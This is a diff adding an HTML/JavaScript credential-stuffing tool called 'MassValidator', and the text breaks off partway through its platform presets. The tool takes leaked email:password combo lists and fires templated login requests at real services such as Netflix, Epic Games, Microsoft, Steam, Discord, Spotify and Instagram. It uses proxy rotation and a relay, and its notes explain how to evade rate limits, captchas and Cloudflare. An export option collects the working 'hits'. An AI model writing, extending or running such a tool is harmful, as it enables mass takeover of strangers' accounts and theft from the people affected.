@@ -1,0 +1,1427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MassValidator</title>
+<style>
+  :root{
+    --bg:#0b0d10; --panel:#12151a; --panel2:#171b22; --line:#232833;
+    --fg:#e6e9ef; --fg-dim:#8b93a3; --fg-mute:#5a6273;
+    --accent:#4f8cff; --accent-dim:#2b5fc4;
+    --hit:#22c55e; --miss:#ef4444; --err:#f59e0b; --unk:#8b93a3; --skip:#6b7280;
+    --warn:#f59e0b;
+    --mono:ui-monospace,SFMono-Regular,"JetBrains Mono",Menlo,Consolas,monospace;
+    --sans:-apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--fg);font-family:var(--sans);font-size:13px;height:100%}
+  body{display:flex;flex-direction:column;overflow:hidden}
+
+  /* ---------- top bar ---------- */
+  .topbar{
+    display:flex;align-items:center;gap:14px;padding:10px 16px;
+    background:var(--panel);border-bottom:1px solid var(--line);flex-shrink:0;
+  }
+  .logo{font-weight:700;letter-spacing:.3px;font-size:15px}
+  .logo span{color:var(--accent)}
+  .status{display:flex;align-items:center;gap:6px;font-family:var(--mono);font-size:11px;color:var(--fg-dim)}
+  .status .dot{width:8px;height:8px;border-radius:50%;background:var(--fg-mute);transition:.2s}
+  .status.running .dot{background:var(--hit);box-shadow:0 0 8px var(--hit)}
+  .status.paused .dot{background:var(--warn)}
+  .status.error .dot{background:var(--miss)}
+  .topbar-spacer{flex:1}
+  .btn{
+    background:var(--panel2);color:var(--fg);border:1px solid var(--line);
+    padding:7px 14px;border-radius:6px;font-size:12px;font-family:var(--sans);
+    cursor:pointer;transition:.15s;font-weight:500;
+  }
+  .btn:hover{background:#1d222b;border-color:#2e3644}
+  .btn:disabled{opacity:.4;cursor:not-allowed}
+  .btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+  .btn.primary:hover{background:#3b7af0}
+  .btn.danger{background:#2a1414;border-color:#4a1f1f;color:#ff8a8a}
+  .btn.danger:hover{background:#3a1a1a}
+  .btn.small{padding:5px 10px;font-size:11px}
+
+  /* ---------- main layout ---------- */
+  .main{display:grid;grid-template-columns:1fr 1fr;flex:1;min-height:0;gap:0}
+  .col{display:flex;flex-direction:column;min-height:0;border-right:1px solid var(--line)}
+  .col:last-child{border-right:none}
+  .col-inner{flex:1;overflow-y:auto;padding:14px}
+  .col-inner::-webkit-scrollbar{width:10px}
+  .col-inner::-webkit-scrollbar-track{background:transparent}
+  .col-inner::-webkit-scrollbar-thumb{background:#252b36;border-radius:5px}
+  .col-inner::-webkit-scrollbar-thumb:hover{background:#333b4a}
+
+  .section{background:var(--panel);border:1px solid var(--line);border-radius:8px;margin-bottom:12px}
+  .section-head{
+    padding:9px 12px;border-bottom:1px solid var(--line);
+    font-size:11px;text-transform:uppercase;letter-spacing:.6px;
+    color:var(--fg-dim);font-weight:600;display:flex;align-items:center;gap:8px;
+  }
+  .section-head .badge{
+    background:var(--panel2);padding:2px 7px;border-radius:10px;
+    font-size:10px;color:var(--fg-dim);text-transform:none;letter-spacing:0;
+  }
+  .section-body{padding:12px}
+
+  /* drop zone */
+  .drop{
+    border:2px dashed var(--line);border-radius:8px;padding:26px 16px;
+    text-align:center;cursor:pointer;transition:.15s;background:#0e1116;
+  }
+  .drop:hover,.drop.over{border-color:var(--accent);background:#111826}
+  .drop-icon{font-size:26px;margin-bottom:6px;opacity:.6}
+  .drop-title{font-size:13px;font-weight:600;margin-bottom:3px}
+  .drop-sub{font-size:11px;color:var(--fg-dim)}
+
+  textarea,input[type=text],input[type=number],select{
+    width:100%;background:#0e1116;color:var(--fg);border:1px solid var(--line);
+    border-radius:6px;padding:8px 10px;font-family:var(--mono);font-size:12px;
+    outline:none;transition:.15s;resize:vertical;
+  }
+  textarea:focus,input:focus,select:focus{border-color:var(--accent)}
+  textarea{min-height:80px;line-height:1.5}
+  label{display:block;font-size:11px;color:var(--fg-dim);margin-bottom:5px;font-weight:500}
+  .field{margin-bottom:10px}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .row-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
+
+  .chip-row{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px}
+  .chip{
+    background:var(--panel2);border:1px solid var(--line);border-radius:14px;
+    padding:3px 9px;font-size:11px;color:var(--fg-dim);cursor:pointer;transition:.15s;
+  }
+  .chip:hover{border-color:var(--accent);color:var(--fg)}
+  .chip.active{background:var(--accent);border-color:var(--accent);color:#fff}
+
+  .toggle{
+    display:flex;align-items:center;gap:8px;font-size:12px;color:var(--fg);
+    cursor:pointer;user-select:none;padding:4px 0;
+  }
+  .toggle input{display:none}
+  .toggle .box{
+    width:15px;height:15px;border:1px solid var(--line);border-radius:3px;
+    background:#0e1116;flex-shrink:0;position:relative;transition:.15s;
+  }
+  .toggle input:checked + .box{background:var(--accent);border-color:var(--accent)}
+  .toggle input:checked + .box::after{
+    content:'';position:absolute;left:4px;top:1px;width:4px;height:8px;
+    border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg);
+  }
+
+  /* stats grid */
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
+  .stat{background:#0e1116;border:1px solid var(--line);border-radius:6px;padding:8px 10px}
+  .stat-label{font-size:10px;color:var(--fg-mute);text-transform:uppercase;letter-spacing:.5px}
+  .stat-value{font-family:var(--mono);font-size:16px;font-weight:600;margin-top:2px}
+  .stat.hit .stat-value{color:var(--hit)}
+  .stat.miss .stat-value{color:var(--miss)}
+  .stat.err .stat-value{color:var(--err)}
+
+  /* progress */
+  .progress{height:6px;background:#0e1116;border-radius:3px;overflow:hidden;margin-top:8px;border:1px solid var(--line)}
+  .progress-bar{height:100%;background:var(--accent);width:0%;transition:width .2s;border-radius:3px}
+
+  /* results panel */
+  .results-panel{
+    background:var(--panel);border-top:1px solid var(--line);
+    display:flex;flex-direction:column;height:340px;flex-shrink:0;
+  }
+  .tabs{display:flex;border-bottom:1px solid var(--line);background:var(--panel2);align-items:center}
+  .tab{
+    padding:9px 16px;font-size:12px;color:var(--fg-dim);cursor:pointer;
+    border-bottom:2px solid transparent;transition:.15s;display:flex;gap:8px;align-items:center;
+  }
+  .tab:hover{color:var(--fg)}
+  .tab.active{color:var(--fg);border-bottom-color:var(--accent)}
+  .tab .count{
+    background:#0e1116;padding:1px 7px;border-radius:9px;font-size:10px;
+    font-family:var(--mono);color:var(--fg-dim);
+  }
+  .tab.active .count{background:var(--accent);color:#fff}
+  .tabs-spacer{flex:1}
+  .tabs .btn.small{margin:6px 10px}
+
+  .table-wrap{flex:1;overflow-y:auto;position:relative}
+  .table-wrap::-webkit-scrollbar{width:10px}
+  .table-wrap::-webkit-scrollbar-track{background:transparent}
+  .table-wrap::-webkit-scrollbar-thumb{background:#252b36;border-radius:5px}
+  .vspacer{position:relative}
+  .vrow{
+    display:grid;grid-template-columns:70px 220px 200px 80px 1fr 80px;
+    padding:6px 12px;border-bottom:1px solid #1a1f27;font-family:var(--mono);
+    font-size:11px;align-items:center;position:absolute;left:0;right:0;height:32px;
+  }
+  .vrow:hover{background:#12161c}
+  .vrow .badge{font-size:10px;padding:2px 7px;border-radius:9px;font-weight:600;text-align:center;width:56px}
+  .badge.hit{background:#0f2a1a;color:var(--hit)}
+  .badge.miss{background:#2a1414;color:var(--miss)}
+  .badge.err{background:#2a1f0c;color:var(--err)}
+  .badge.unk{background:#1f242e;color:var(--unk)}
+  .badge.skip{background:#1f242e;color:var(--skip)}
+  .vrow .email{color:var(--fg);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .vrow .pass{color:var(--fg-dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .vrow .time{color:var(--fg-mute);text-align:right}
+  .vrow .note{color:var(--fg-mute);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding-right:12px}
+  .empty{padding:40px;text-align:center;color:var(--fg-mute);font-size:12px}
+
+  /* modal */
+  .modal-bg{
+    position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;
+    align-items:center;justify-content:center;z-index:100;
+  }
+  .modal-bg.open{display:flex}
+  .modal{
+    background:var(--panel);border:1px solid var(--line);border-radius:10px;
+    width:min(720px,92vw);max-height:88vh;display:flex;flex-direction:column;
+    box-shadow:0 20px 60px rgba(0,0,0,.6);
+  }
+  .modal-head{padding:14px 18px;border-bottom:1px solid var(--line);font-weight:600;display:flex;align-items:center;gap:10px}
+  .modal-head .close{margin-left:auto;cursor:pointer;color:var(--fg-dim);font-size:18px;line-height:1}
+  .modal-head .close:hover{color:var(--fg)}
+  .modal-body{padding:18px;overflow-y:auto;flex:1}
+  .modal-foot{padding:12px 18px;border-top:1px solid var(--line);display:flex;justify-content:flex-end;gap:8px}
+
+  .hint{font-size:11px;color:var(--fg-mute);margin-top:4px;line-height:1.5}
+  .hint code{background:#0e1116;padding:1px 5px;border-radius:3px;font-size:10px;color:var(--fg-dim)}
+
+  .sep-list{display:flex;gap:6px;flex-wrap:wrap;margin-top:6px}
+  .sep-btn{
+    background:var(--panel2);border:1px solid var(--line);border-radius:5px;
+    padding:4px 10px;font-family:var(--mono);font-size:12px;color:var(--fg-dim);
+    cursor:pointer;transition:.15s;
+  }
+  .sep-btn:hover{border-color:var(--accent);color:var(--fg)}
+  .sep-btn.active{background:var(--accent);border-color:var(--accent);color:#fff}
+
+  .conf-bar{height:4px;background:#0e1116;border-radius:2px;overflow:hidden;margin-top:6px}
+  .conf-bar-fill{height:100%;background:var(--hit);width:0%;transition:.2s}
+
+  .kbd{font-family:var(--mono);font-size:10px;background:#0e1116;border:1px solid var(--line);padding:1px 5px;border-radius:3px;color:var(--fg-dim)}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="logo">Mass<span>Validator</span></div>
+  <div class="status" id="status"><span class="dot"></span><span id="statusText">idle</span></div>
+  <div class="topbar-spacer"></div>
+  <button class="btn small" id="btnRelay">Relay Config</button>
+  <button class="btn small" id="btnProxy">Proxies</button>
+  <button class="btn small" id="btnExport">Export</button>
+  <button class="btn" id="btnStop" disabled>Stop</button>
+  <button class="btn primary" id="btnStart" disabled>Start Validation</button>
+</div>
+
+<div class="main">
+  <!-- LEFT: input -->
+  <div class="col">
+    <div class="col-inner">
+      <div class="section">
+        <div class="section-head">Input <span class="badge" id="inputCount">0 lines</span></div>
+        <div class="section-body">
+          <div class="drop" id="drop">
+            <div class="drop-icon">↓</div>
+            <div class="drop-title">Drop combo file here</div>
+            <div class="drop-sub">.txt · .csv · .json · any text file — or click to browse</div>
+            <input type="file" id="fileInput" style="display:none" accept=".txt,.csv,.json,.log,text/*">
+          </div>
+          <div style="height:10px"></div>
+          <textarea id="pasteArea" placeholder="...or paste combos here (one per line)"></textarea>
+          <div class="hint">Supported formats: <code>email:pass</code> · <code>user:pass</code> · <code>email|pass</code> · <code>email;pass</code> · <code>url:user:pass</code> · <code>ip:port:user:pass</code> · JSON lines</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-head">Parse Config</div>
+        <div class="section-body">
+          <div class="field">
+            <label>Separator</label>
+            <div class="sep-list" id="sepList">
+              <div class="sep-btn active" data-sep="auto">auto</div>
+              <div class="sep-btn" data-sep=":">:</div>
+              <div class="sep-btn" data-sep="|">|</div>
+              <div class="sep-btn" data-sep=";">;</div>
+              <div class="sep-btn" data-sep=",">,</div>
+              <div class="sep-btn" data-sep="tab">tab</div>
+              <div class="sep-btn" data-sep="space">space</div>
+            </div>
+            <div class="hint" id="detectHint">Detection confidence: —</div>
+            <div class="conf-bar"><div class="conf-bar-fill" id="confFill"></div></div>
+          </div>
+
+          <div class="field">
+            <label>Deduplication</label>
+            <select id="dedupMode">
+              <option value="none">none — keep all</option>
+              <option value="line" selected>by full line</option>
+              <option value="email">by email / user</option>
+              <option value="combo">by email:pass combo</option>
+            </select>
+          </div>
+
+          <div class="field">
+            <label>Filters</label>
+            <input type="text" id="filterInclude" placeholder="include regex (optional)">
+            <div style="height:6px"></div>
+            <input type="text" id="filterExclude" placeholder="exclude regex (optional)">
+            <div style="height:6px"></div>
+            <input type="text" id="filterDomains" placeholder="domain whitelist, comma-separated (optional)">
+            <div style="height:6px"></div>
+            <input type="text" id="filterBadDomains" placeholder="domain blacklist, comma-separated (optional)">
+          </div>
+
+          <label class="toggle"><input type="checkbox" id="optEmailOnly"><span class="box"></span>only lines with valid email</label>
+          <label class="toggle"><input type="checkbox" id="optSkipEmpty"><span class="box"></span>skip lines with empty pass</label>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-head">Stats</div>
+        <div class="section-body">
+          <div class="stats">
+            <div class="stat"><div class="stat-label">Total</div><div class="stat-value" id="sTotal">0</div></div>
+            <div class="stat"><div class="stat-label">Queued</div><div class="stat-value" id="sQueued">0</div></div>
+            <div class="stat hit"><div class="stat-label">Hit</div><div class="stat-value" id="sHit">0</div></div>
+            <div class="stat miss"><div class="stat-label">Miss</div><div class="stat-value" id="sMiss">0</div></div>
+            <div class="stat err"><div class="stat-label">Error</div><div class="stat-value" id="sErr">0</div></div>
+            <div class="stat"><div class="stat-label">Rate</div><div class="stat-value" id="sRate">0/s</div></div>
+            <div class="stat"><div class="stat-label">Done</div><div class="stat-value" id="sDone">0</div></div>
+            <div class="stat"><div class="stat-label">ETA</div><div class="stat-value" id="sEta">—</div></div>
+          </div>
+          <div class="progress"><div class="progress-bar" id="progBar"></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- RIGHT: config -->
+  <div class="col">
+    <div class="col-inner">
+      <div class="section">
+        <div class="section-head">Platform Preset</div>
+        <div class="section-body">
+          <div class="field">
+            <select id="presetSelect"></select>
+            <div class="hint" id="presetHint">Pick a platform to auto-fill the request template.</div>
+          </div>
+          <div class="row-3">
+            <div class="field">
+              <label>Format</label>
+              <input type="text" id="pFormat" readonly>
+            </div>
+            <div class="field">
+              <label>Concurrency</label>
+              <input type="number" id="pConcur" min="1" max="200" value="3">
+            </div>
+            <div class="field">
+              <label>Throttle (ms)</label>
+              <input type="number" id="pThrottle" min="0" max="60000" value="300">
+            </div>
+          </div>
+          <div class="hint" id="presetNotes"></div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-head">Validation Mode</div>
+        <div class="section-body">
+          <select id="valMode">
+            <option value="format">format only — offline, fast</option>
+            <option value="mx" selected>format + MX (DNS-over-HTTPS)</option>
+            <option value="http">HTTP login — templated request</option>
+          </select>
+          <div class="hint" id="modeHint">MX mode verifies the email domain has mail servers. Fast, no target involvement.</div>
+        </div>
+      </div>
+
+      <div class="section" id="httpSection" style="display:none">
+        <div class="section-head">
+          Request Template
+          <span class="badge">HTTP mode</span>
+        </div>
+        <div class="section-body">
+          <div class="row">
+            <div class="field">
+              <label>Method</label>
+              <select id="reqMethod">
+                <option>POST</option><option>GET</option><option>PUT</option><option>PATCH</option>
+              </select>
+            </div>
+            <div class="field">
+              <label>URL</label>
+              <input type="text" id="reqUrl" placeholder="https://example.com/api/login">
+            </div>
+          </div>
+          <div class="field">
+            <label>Headers (one per line, Key: Value)</label>
+            <textarea id="reqHeaders" placeholder="Content-Type: application/x-www-form-urlencoded&#10;User-Agent: Mozilla/5.0"></textarea>
+          </div>
+          <div class="field">
+            <label>Body (use {{email}} {{user}} {{pass}} {{domain}})</label>
+            <textarea id="reqBody" placeholder="email={{email}}&password={{pass}}"></textarea>
+          </div>
+          <div class="field">
+            <label>Response Matcher</label>
+            <div class="row-3">
+              <select id="matchType">
+                <option value="status-in">status in list</option>
+                <option value="body-contains" selected>body contains</option>
+                <option value="body-regex">body regex</option>
+                <option value="header-contains">header contains</option>
+              </select>
+              <input type="text" id="matchPattern" placeholder="access_token" style="grid-column:span 2">
+            </div>
+            <div style="height:6px"></div>
+            <div class="row">
+              <input type="text" id="matchStatusList" placeholder="200,201,302" value="200,201,302">
+              <label class="toggle"><input type="checkbox" id="matchInvert"><span class="box"></span>invert (match = MISS)</label>
+            </div>
+            <div class="hint">If the response satisfies the matcher → HIT. Otherwise → MISS.</div>
+          </div>
+          <div class="row">
+            <div class="field">
+              <label>Retries on error</label>
+              <input type="number" id="reqRetries" min="0" max="5" value="1">
+            </div>
+            <div class="field">
+              <label>Timeout (ms)</label>
+              <input type="number" id="reqTimeout" min="1000" max="120000" value="15000">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-head">Secrets / Placeholders</div>
+        <div class="section-body">
+          <div class="hint">Fill any <code>{{NAME}}</code> tokens used by the template. Saved to localStorage.</div>
+          <div id="secretsArea" style="margin-top:10px"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- RESULTS -->
+<div class="results-panel">
+  <div class="tabs">
+    <div class="tab active" data-tab="all">All <span class="count" id="cAll">0</span></div>
+    <div class="tab" data-tab="hit">Hits <span class="count" id="cHit">0</span></div>
+    <div class="tab" data-tab="miss">Misses <span class="count" id="cMiss">0</span></div>
+    <div class="tab" data-tab="err">Errors <span class="count" id="cErr">0</span></div>
+    <div class="tabs-spacer"></div>
+    <input type="text" id="resultSearch" placeholder="search…" style="width:220px;margin:6px 10px">
+  </div>
+  <div class="table-wrap" id="tableWrap">
+    <div class="vspacer" id="vspacer"></div>
+  </div>
+</div>
+
+<!-- PROXXY MODAL -->
+<div class="modal-bg" id="proxyModal">
+  <div class="modal">
+    <div class="modal-head">Proxy List <span class="close" data-close="proxyModal">×</span></div>
+    <div class="modal-body">
+      <label>One proxy per line — format <code>http://user:pass@host:port</code> or <code>host:port</code></label>
+      <textarea id="proxyList" style="min-height:180px" placeholder="http://1.2.3.4:8080&#10;http://user:pass@5.6.7.8:3128"></textarea>
+      <div class="hint">Browsers cannot set a proxy directly. Proxies only apply when <b>Relay URL</b> is set — the relay forwards upstream. Direct mode ignores this list.</div>
+      <div style="height:8px"></div>
+      <label>Rotation</label>
+      <select id="proxyRotation">
+        <option value="round">round-robin</option>
+        <option value="random">random</option>
+      </select>
+    </div>
+    <div class="modal-foot">
+      <button class="btn" data-close="proxyModal">Close</button>
+      <button class="btn primary" id="saveProxies">Save</button>
+    </div>
+  </div>
+</div>
+
+<!-- RELAY MODAL -->
+<div class="modal-bg" id="relayModal">
+  <div class="modal">
+    <div class="modal-head">Relay Configuration <span class="close" data-close="relayModal">×</span></div>
+    <div class="modal-body">
+      <div class="field">
+        <label>Relay URL (optional)</label>
+        <input type="text" id="relayUrl" placeholder="http://127.0.0.1:8787/proxy">
+        <div class="hint">If set, all HTTP requests go through the relay. The relay adds CORS headers, forwards upstream, and supports per-request proxy selection via the <code>X-Target-Proxy</code> header. A ready-to-run relay script is in the technical notes.</div>
+      </div>
+      <div class="field">
+        <label>Direct request mode (no relay)</label>
+        <select id="directMode">
+          <option value="cors">CORS — read response (works on permissive targets)</option>
+          <option value="nocors">no-cors — fire-and-forget, response unreadable</option>
+        </select>
+      </div>
+      <div class="hint"><b>CORS reality:</b> cross-origin fetches only work if the target sends CORS headers, or if the browser is started with <code>--disable-web-security</code>. The relay solves this cleanly.</div>
+    </div>
+    <div class="modal-foot">
+      <button class="btn" data-close="relayModal">Close</button>
+      <button class="btn primary" id="saveRelay">Save</button>
+    </div>
+  </div>
+</div>
+
+<!-- EXPORT MODAL -->
+<div class="modal-bg" id="exportModal">
+  <div class="modal">
+    <div class="modal-head">Export Results <span class="close" data-close="exportModal">×</span></div>
+    <div class="modal-body">
+      <div class="field">
+        <label>What to export</label>
+        <select id="exportWhat">
+          <option value="hit">HIT only (email:pass)</option>
+          <option value="miss">MISS only</option>
+          <option value="err">ERROR only</option>
+          <option value="all-combos">All — combos only (original format)</option>
+          <option value="all-csv">All — CSV with status</option>
+        </select>
+      </div>
+      <div class="hint">Downloads as <code>.txt</code> or <code>.csv</code> depending on the choice.</div>
+    </div>
+    <div class="modal-foot">
+      <button class="btn" data-close="exportModal">Close</button>
+      <button class="btn primary" id="doExport">Download</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/* =========================================================
+   MassValidator — single-file client
+   ========================================================= */
+
+/* ---------------- PRESETS ---------------- */
+const PRESETS = [
+  {
+    id: 'custom', name: '— Custom / no preset —', format: 'any',
+    notes: 'Fill the request template manually.'
+  },
+  {
+    id: 'netflix', name: 'Netflix', format: 'email:pass',
+    method: 'POST',
+    url: 'https://www.netflix.com/api/shakti/v1/login',
+    headers: {
+      'Content-Type': 'application/json',
+      'Accept': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
+    },
+    body: '{"email":"{{email}}","password":"{{pass}}","authURL":"{{NETFLIX_AUTHURL}}"}',
+    matcher: { type: 'body-contains', pattern: '"userInfo"', invert: false },
+    hitCodes: [200],
+    concurrency: 2, throttle: 800,
+    notes: 'Requires a fresh authURL token grabbed from the /login page. Paste into Secrets as NETFLIX_AUTHURL. Changes often — refresh per session.'
+  },
+  {
+    id: 'crunchyroll', name: 'Crunchyroll', format: 'email:pass',
+    method: 'POST',
+    url: 'https://sso.crunchyroll.com/api/v1/login',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': 'Basic {{CRUNCHY_BASIC}}',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
+    },
+    body: '{"email":"{{email}}","password":"{{pass}}"}',
+    matcher: { type: 'body-contains', pattern: 'access_token', invert: false },
+    hitCodes: [200],
+    concurrency: 3, throttle: 400,
+    notes: 'Basic auth is a public web client credential. Cloudflare may block — use relay or residential proxies.'
+  },
+  {
+    id: 'epic', name: 'Epic Games / Fortnite', format: 'email:pass',
+    method: 'POST',
+    url: 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Authorization': 'Basic {{EPIC_LAUNCHER_BASIC}}',
+      'User-Agent': 'EpicGamesLauncher/14.0.8-14714194+++Portal+Release-Live Windows/10.0.19044.1.256.64bit'
+    },
+    body: 'grant_type=password&username={{email}}&password={{pass}}&token_type=eg1',
+    matcher: { type: 'body-contains', pattern: 'access_token', invert: false },
+    hitCodes: [200],
+    concurrency: 3, throttle: 300,
+    notes: 'Basic auth = launcher client_id:secret (public knowledge). Put in Secrets as EPIC_LAUNCHER_BASIC. 2FA accounts will return error.'
+  },
+  {
+    id: 'nintendo', name: 'Nintendo Account', format: 'email:pass',
+    method: 'POST',
+    url: 'https://accounts.nintendo.com/connect/1.0.0/api/token',
+    headers: {
+      'Content-Type': 'application/json',
+      'User-Agent': 'Nintendo Switch/12.1.0'
+    },
+    body: '{"client_id":"{{NINTENDO_CLIENT_ID}}","grant_type":"password","username":"{{email}}","password":"{{pass}}"}',
+    matcher: { type: 'body-contains', pattern: 'access_token', invert: false },
+    hitCodes: [200],
+    concurrency: 2, throttle: 800,
+    notes: 'client_id is the public web app id. Fill NINTENDO_CLIENT_ID in Secrets. Rate-limited hard.'
+  },
+  {
+    id: 'hotmail', name: 'Microsoft / Hotmail / Outlook', format: 'email:pass',
+    method: 'POST',
+    url: 'https://login.live.com/ppsecure/post.srf',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
+    },
+    body: 'login={{email}}&passwd={{pass}}&PPFT={{MS_PPFT}}',
+    matcher: { type: 'body-contains', pattern: 'ANON', invert: true },
+    hitCodes: [200, 302],
+    concurrency: 1, throttle: 1500,
+    notes: 'Microsoft flow uses a per-session PPFT token + flowToken. Grab a fresh one from the login page before each batch and paste as MS_PPFT. Very fragile — expect low yield without a full flow implementation.'
+  },
+  {
+    id: 'steam', name: 'Steam', format: 'user:pass',
+    method: 'POST',
+    url: 'https://store.steampowered.com/login/dologin/',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
+    },
+    body: 'username={{user}}&password={{pass}}&rsatimestamp={{STEAM_TS}}&donotcache={{STEAM_CACHE}}',
+    matcher: { type: 'body-contains', pattern: '"success":true', invert: false },
+    hitCodes: [200],
+    concurrency: 2, throttle: 1000,
+    notes: 'Uses username not email. Requires RSA key + timestamp fetched from /login/getrsakey/. Steam Guard will block most accounts. Only non-guarded or already-authorized sessions yield success.'
+  },
+  {
+    id: 'minecraft', name: 'Minecraft (Microsoft)', format: 'email:pass',
+    method: 'POST',
+    url: 'https://login.live.com/ppsecure/post.srf',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
+    },
+    body: 'login={{email}}&passwd={{pass}}&PPFT={{MS_PPFT}}',
+    matcher: { type: 'body-contains', pattern: 'ANON', invert: true },
+    hitCodes: [200, 302],
+    concurrency: 1, throttle: 1500,
+    notes: 'Same Microsoft flow as Hotmail. For a full Minecraft login you need the Xbox Live + XSTS chain after MS auth — treat this as credential check only.'
+  },
+  {
+    id: 'roblox', name: 'Roblox', format: 'user:pass or email:pass',
+    method: 'POST',
+    url: 'https://auth.roblox.com/v2/login',
+    headers: {
+      'Content-Type': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
+      'X-CSRF-TOKEN': '{{ROBLOX_CSRF}}'
+    },
+    body: '{"ctype":"Username","cvalue":"{{user}}","password":"{{pass}}"}',
+    matcher: { type: 'body-contains', pattern: '"userId"', invert: false },
+    hitCodes: [200],
+    concurrency: 1, throttle: 2000,
+    notes: 'Needs an X-CSRF-TOKEN from any authenticated request first. Put in Secrets as ROBLOX_CSRF. Aggressive rate limits + captcha after a few requests.'
+  },
+  {
+    id: 'discord', name: 'Discord', format: 'email:pass',
+    method: 'POST',
+    url: 'https://discord.com/api/v9/auth/login',
+    headers: {
+      'Content-Type': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
+      'X-Super-Properties': '{{DISCORD_SUPER}}'
+    },
+    body: '{"login":"{{email}}","password":"{{pass}}","undelete":false,"captcha_key":null}',
+    matcher: { type: 'body-contains', pattern: '"token"', invert: false },
+    hitCodes: [200],
+    concurrency: 2, throttle: 1000,
+    notes: 'X-Super-Properties is a base64 JSON browser fingerprint. Grab a fresh one from DevTools before running. Captcha triggers after a few attempts per IP.'
+  },
+  {
+    id: 'spotify', name: 'Spotify', format: 'email:pass',
+    method: 'POST',
+    url: 'https://accounts.spotify.com/api/login',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Authorization': 'Basic {{SPOTIFY_BASIC}}',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
+    },
+    body: 'username={{email}}&password={{pass}}&remember=true',
+    matcher: { type: 'body-contains', pattern: 'displayName', invert: false },
+    hitCodes: [200],
+    concurrency: 3, throttle: 400,
+    notes: 'Basic auth = web player client id:secret (public knowledge). Put in Secrets as SPOTIFY_BASIC.'
+     },
+  {
+    id: 'twitter', name: 'Twitter / X', format: 'user:pass or email:pass',
+    method: 'POST',
+    url: 'https://api.x.com/1.1/onboarding/task.json',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': 'Bearer {{TWITTER_BEARER}}',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
+    },
+    body: '{"input_flow_data":{"flow_context":{"debug_overrides":{}}},"subtask_versions":{}}',
+    matcher: { type: 'status-in', pattern: '200', invert: false },
+    hitCodes: [200],
+    concurrency: 1, throttle: 2000,
+    notes: 'Real X login is a multi-step onboarding flow with flow tokens. This is a shape example — you must capture a live flow and adapt. High anti-automation resistance.'
+  },
+  {
+    id: 'instagram', name: 'Instagram', format: 'user:pass',
+    method: 'POST',
+    url: 'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'X-CSRFToken': '{{IG_CSRF}}',
+      'X-IG-App-ID': '936619743392459',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
+    },
+    body: 'username={{user}}&enc_password={{IG_ENC}}&queryParams={}&optIntoOneTap=false',
+    matcher: { type: 'body-contains', pattern: '"authenticated":true', invert: false },
+    hitCodes: [200],
+    concurrency: 1, throttle: 3000,
+    notes: 'enc_password is a per-request PGP-encrypted blob — needs the current pubkey from /api/v1/web/accounts/login/ajax/. CSRF from cookie. Very fragile, expect low throughput.'
+  },
+  {
+    id: 'twitch', name: 'Twitch', format: 'user:pass',
+    method: 'POST',
+    url: 'https://passport.twitch.tv/login',
+    headers: {
+      'Content-Type': 'application/json',
+      'Client-Id': '{{TWITCH_CLIENT_ID}}',
